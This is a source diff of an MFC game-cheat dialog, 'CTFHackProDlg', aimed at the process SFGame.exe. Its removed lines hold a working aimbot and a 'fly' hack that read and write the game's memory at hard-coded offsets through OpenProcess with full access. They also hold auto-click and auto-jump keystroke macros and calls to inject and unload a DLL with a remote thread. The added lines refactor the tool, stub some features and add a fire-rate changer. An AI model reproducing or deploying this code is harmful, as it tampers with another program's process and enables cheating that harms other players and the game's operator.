-	else if (g_Button2_Flag == TRUE)
+	else if (g_bFlag2 == TRUE)
 	{
 		BOOL Flag = RemoteThreadDllFree(L"SFGame.exe", exeFullPath);
 
 		if (Flag == TRUE)
 		{
-			g_Button2_Flag = FALSE;
+			g_bFlag2 = FALSE;
 			AfxMessageBox(L"卸载成功");
 		}
 	}
 	UpdateData(FALSE);
 }
 
-
-void CTFHackProDlg::OnBnClickedButton3()
-{
-	// TODO: 在此添加控件通知处理程序代码
-	UpdateData(TRUE);
-	MyThread2 = AfxBeginThread(AddAmmo, NULL);
-	UpdateData(FALSE);
-}
-
-
+BOOL g_bFlag4 = FALSE;
 void CTFHackProDlg::OnBnClickedButton4()
 {
-	// TODO: 在此添加控件通知处理程序代码
 	UpdateData(TRUE);
-	MyThread3 = AfxBeginThread(ZeroRecoil, NULL);
+	g_bFlag4 = !g_bFlag4;
+	ZeroRecoil(g_bFlag4);
 	UpdateData(FALSE);
 }
 
@@ -667,46 +241,18 @@ HANDLE hThread5;
 void CTFHackProDlg::OnBnClickedButton5()
 {
 	UpdateData(TRUE);
-	//MyThread4 = AfxBeginThread(ESPBox, NULL);
-	if (bFlag5 == 0)
-	{
-		hThread5 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ESPBox, NULL, 0, 0);
-		bFlag5 = 1;
-	}
-	else
-	{
-		TerminateThread(hThread5, 0);
-		CloseHandle(hThread5);
-		bFlag5 = 0;
-	}
+	AfxMessageBox(L"更新中。。。");
 	UpdateData(FALSE);
-}
-
-UINT KeyEmulate(LPVOID lpParam)
-{
-	while (1)
-	{
-		if (GetAsyncKeyState(VK_RBUTTON) < 0)
-		{
-			keybd_event(VK_LBUTTON, MapVirtualKey(VK_LBUTTON, 0), 0, 0);
-			Sleep(10);
-			keybd_event(VK_LBUTTON, MapVirtualKey(VK_LBUTTON, 0), KEYEVENTF_KEYUP, 0);
-		}
-		Sleep(10);
-	}
-	return 0;
 }
 
 BOOL bFlag6 = 0;
 HANDLE hThread6;
-
 void CTFHackProDlg::OnBnClickedButton6()
 {
-	// TODO: 在此添加控件通知处理程序代码
 	UpdateData(TRUE);
 	if (bFlag6 == 0)
 	{
-		hThread6 = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)KeyEmulate, NULL,0,0);
+		hThread6 = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)RightButtonSimulate, NULL,0,0);
 		bFlag6 = 1;
 	}
 	else
@@ -718,107 +264,9 @@ void CTFHackProDlg::OnBnClickedButton6()
 	UpdateData(FALSE);
 }
 
-
-
-UINT BigJump(LPVOID lpParam)
-{
-	while (TRUE)
-	{
-		if (GetAsyncKeyState(0x43) < 0)
-		{
-			keybd_event(VK_LCONTROL, MapVirtualKey(VK_LCONTROL, 0), 0, 0);
-			Sleep(1);
-			keybd_event(VK_SPACE, MapVirtualKey(VK_SPACE, 0), 0, 0);
-			Sleep(400);
-			keybd_event(VK_LCONTROL, MapVirtualKey(VK_LCONTROL, 0), KEYEVENTF_KEYUP, 0);
-			keybd_event(VK_SPACE, MapVirtualKey(VK_SPACE, 0), KEYEVENTF_KEYUP, 0);
-			Sleep(1000);
-			keybd_event(VK_LCONTROL, MapVirtualKey(VK_LCONTROL, 0), KEYEVENTF_KEYUP, 0);
-			keybd_event(VK_SPACE, MapVirtualKey(VK_SPACE, 0), KEYEVENTF_KEYUP, 0);
-		}
-		//Sleep(1000);
-	}
-	return 0;
-}
-
-BOOL g_bFlag7 = FALSE;
-HANDLE hThread7;
-
-void CTFHackProDlg::OnBnClickedButton8()
-{
-	if (g_bFlag7)
-	{
-		TerminateThread(hThread7, 0);
-		CloseHandle(hThread7);
-		g_bFlag7 = FALSE;
-	}
-	else
-	{
-		hThread7 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BigJump, NULL, 0, 0);
-		g_bFlag7 = TRUE;
-
-	}
-}
-
-
-UINT LocalFly()
-{
-	//AllocConsole();
-	//SetConsoleTitle(L"LocalFly");
-	//FILE* stream;
-	//freopen_s(&stream, "CON", "w", stdout);
-	//printf("ok\n");
-
-	DWORD dwTemp = 0;
-	float Accelerate = 0;
-	SIZE_T qwRet = 0;
-	DWORD dwPid = GetProcessIdByProcessName(L"SFGame.exe");
-	HANDLE hProcess = NULL;
-	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
-	if (hProcess==INVALID_HANDLE_VALUE ||hProcess==NULL)
-	{
-		AfxMessageBox(L"打开进程失败，请以管理员权限运行");
-		return -1;
-	}
-	else
-	{
-		AfxMessageBox(L"本功能仅在本地可用\n\n空格一键上天\nX键飞天\nAlt键落地缓冲\n");
-	}
-	DWORD dwBaseAddr = GetProcessModuleBaseAddress(dwPid, L"SFGame.exe");
-	while (true)
-	{
-		if (GetAsyncKeyState(VK_SPACE))
-		{
-			ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddr + 0x013ED5C8), &dwTemp, 4, &qwRet);
-			ReadProcessMemory(hProcess, (LPCVOID)(dwTemp + 0x188), &Accelerate, 4, &qwRet);
-			Accelerate += 2;
-			WriteProcessMemory(hProcess, (LPVOID)(dwTemp + 0x188), &Accelerate, 4, &qwRet);
-			//printf("%f\n", Accelerate);
-			Sleep(0);
-		}
-		if (GetAsyncKeyState(0x58))
-		{
-			ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddr + 0x013ED5C8), &dwTemp, 4, &qwRet);
-			Accelerate = 500;
-			WriteProcessMemory(hProcess, (LPVOID)(dwTemp + 0x188), &Accelerate, 4, &qwRet);
-			//printf("%f\n", Accelerate);
-		}
-		if (GetAsyncKeyState(VK_MENU))
-		{
-			ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddr + 0x013ED5C8), &dwTemp, 4, &qwRet);
-			Accelerate = -100;
-			WriteProcessMemory(hProcess, (LPVOID)(dwTemp + 0x188), &Accelerate, 4, &qwRet);
-			//printf("%f\n", Accelerate);
-
-		}
-	}
-	return 0;
-}
-
 BOOL g_bFlag8 = FALSE;
 HANDLE hThread8;
-
-void CTFHackProDlg::OnBnClickedButton9()
+void CTFHackProDlg::OnBnClickedButton8()
 {
 	if (g_bFlag8)
 	{
@@ -828,134 +276,38 @@ void CTFHackProDlg::OnBnClickedButton9()
 	}
 	else
 	{
-		hThread8 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LocalFly, NULL, 0, 0);
+		hThread8 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BigJump, NULL, 0, 0);
 		g_bFlag8 = TRUE;
 
 	}
 }
 
-
-
-BOOL AimBot(LPARAM lparam)
-{
-	SetDebugConsole(L"Test");
-
-	DWORD dwPid = GetProcessIdByProcessName(L"SFGame.exe");
-	DWORD dwBaseAddr = GetProcessModuleBaseAddress(dwPid, L"SFGame.exe");
-	if (dwBaseAddr == FALSE)
-		return 0;
-	DWORD dwTmp = 0;
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
-	Sleep(50);
-
-	DWORD dwHp = 0;
-	char buffer[4] = { 0 };
-	Vec3 Pos = { 0 };
-	Vec3 MyPos = { 0 };
-	Vec3 RePos = { 0 };
-	int dwDis = 0;
-
-	double Pitch = 0;
-	double Yaw = 0;
-
-	int GamePitch = 0;
-	int GameYaw = 0;
-
-	int TempPitch = 0;
-	int TempYaw = 0;
-	int tmp = 0;
-
-	double dis = 0;
-
-	BOOL bFlag = FALSE;
-
-	while (TRUE)
-	{
-		if (GetKeyState(VK_MENU) & 0x8000 || GetKeyState(VK_LBUTTON) & 0x8000 || GetKeyState(VK_RBUTTON) & 0x8000)
-		{
-			for (size_t i = 0; i < GetpplNum(hProcess, dwBaseAddr) * 2; i++)
-			{
-				GetPos(hProcess, &Pos, &dwHp, dwBaseAddr, i);
-				if (dwHp > 0 && dwHp < 1000)
-				{
-					//Get My Position
-					ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddr + 0x013ED5C8), &buffer, 4, NULL);	//dwTemp优化掉了
-					ReadProcessMemory(hProcess, (LPCVOID)(*(DWORD*)buffer + 0x54), &MyPos, 12, NULL);	//
-
-					RePos.x = Pos.x - MyPos.x;
-					RePos.y = Pos.y - MyPos.y;
-					RePos.z = Pos.z - MyPos.z;
-					//if (RePos.x != 0 & RePos.y != 0 & RePos.z != 0)
-					//	continue;
-					dis = sqrt((double)RePos.x * RePos.x + (double)RePos.y * RePos.y + (double)RePos.z * RePos.z);
-					if (dis < 0.01 || dis > 2000)	continue;
-
-					Pitch = atan2(RePos.y, RePos.x) * 180.f / PIE;
-					double tmp1 = pow(RePos.x, 2) + pow(RePos.y, 2);
-					Yaw = -atan2(-RePos.z, sqrt(tmp1)) * 180.f / PIE;
-
-					//printf("%f\t%f\n", Pitch, Yaw);
-
-					ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddr + 0x013ED5C4), &dwTmp, 4, NULL);
-					ReadProcessMemory(hProcess, (LPVOID)(dwTmp + 0x64), &TempPitch, 4, NULL);
-					ReadProcessMemory(hProcess, (LPVOID)(dwTmp + 0x60), &TempYaw, 4, NULL);
-
-					GamePitch = (int)(Pitch * 65536 / 360) - 10;
-					GameYaw = (int)(Yaw * 65536 / 360) - 10;
-
-					GamePitch %= 65536;
-					GameYaw %= 65536;
-					if (GamePitch < 0)
-						GamePitch += 65536;
-					if (GameYaw < 0)
-						GameYaw += 65536;
-					//
-					TempPitch %= 65536;
-					TempYaw %= 65536;
-					if (TempPitch < 0)
-						TempPitch += 65536;
-					if (TempYaw < 0)
-						TempYaw += 65536;
-
-					tmp = TempPitch - GamePitch;
-					if (abs(tmp) > 1250)
-						continue;
-					tmp = TempYaw - GameYaw;
-					if (abs(tmp) > 1250)	//2731
-						continue;
-
-					//printf("%d\n", TempPitch);
-					printf("%d\t%d\n", GamePitch, GameYaw);
-
-					if (GamePitch != 0 && GameYaw != 0)
-					{
-						WriteProcessMemory(hProcess, (LPVOID)(dwTmp + 0x64), &GamePitch, 4, NULL);
-						WriteProcessMemory(hProcess, (LPVOID)(dwTmp + 0x60), &GameYaw, 4, NULL);
-					}
-				}
-			}
-		}
-	}
-	CloseHandle(hProcess);
-	return 0;
-}
-
-BOOL g_bFlag9 = FALSE;
-HANDLE hThread9;
-
+BOOL g_bFlag10 = FALSE;
+HANDLE hThread10;
 void CTFHackProDlg::OnBnClickedButton10()
 {
-	
-	if (g_bFlag9)
+	UpdateData(TRUE);
+	AfxMessageBox(L"更新中。。。");
+	UpdateData(FALSE);
+}
+
+
+BOOL g_bFlag11 = FALSE;
+HANDLE hThread11;
+void CTFHackProDlg::OnBnClickedButton11()
+{
+	UpdateData(TRUE);
+	if (g_bFlag11 == 0)
 	{
-		TerminateThread(hThread9, 0);
-		CloseHandle(hThread9);
-		g_bFlag9 = FALSE;
+		AfxMessageBox(L"捡枪后按下F4即可改枪\n直接改枪会卡出去");
+		hThread11 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ChangeShootSpeed, NULL, 0, 0);
+		g_bFlag11 = 1;
 	}
 	else
 	{
-		hThread9 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AimBot, NULL, 0, 0);
-		g_bFlag9 = TRUE;
-
+		TerminateThread(hThread11, 0);
+		CloseHandle(hThread11);
+		g_bFlag11 = 0;
 	}
+	UpdateData(FALSE);
 }
